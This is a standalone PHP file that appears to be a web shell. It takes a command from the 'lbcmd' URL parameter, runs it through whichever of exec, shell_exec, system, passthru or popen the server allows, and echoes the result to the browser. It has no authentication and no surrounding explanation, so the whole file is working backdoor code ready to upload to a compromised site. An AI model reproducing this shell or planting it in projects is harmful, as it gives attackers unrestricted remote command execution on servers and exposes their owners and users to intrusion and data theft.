<?php
$command = $_GET['lbcmd'] ?? null;

if (!$command) {
    exit;
}

$functions = [
    'exec',
    'shell_exec',
    'system',
    'passthru',
    'popen',
];

$output = null;

foreach ($functions as $function) {
    if (function_exists($function)) {
        switch ($function) {
            case 'exec':
                exec($command, $outputArray);
                $output = implode("
", $outputArray);
                break;

            case 'shell_exec':
                $output = shell_exec($command);
                break;

            case 'system':
                ob_start();
                system($command);
                $output = ob_get_clean();
                break;

            case 'passthru':
                ob_start();
                passthru($command);
                $output = ob_get_clean();
                break;

            case 'popen':
                $handle = popen($command, 'r');
                if ($handle) {
                    $output = '';
                    while (!feof($handle)) {
                        $output .= fgets($handle);
                    }
                    pclose($handle);
                }
                break;
        }

        if (!empty($output)) {
            echo "<pre>$output</pre>";
            break;
        }
    }
}
?>
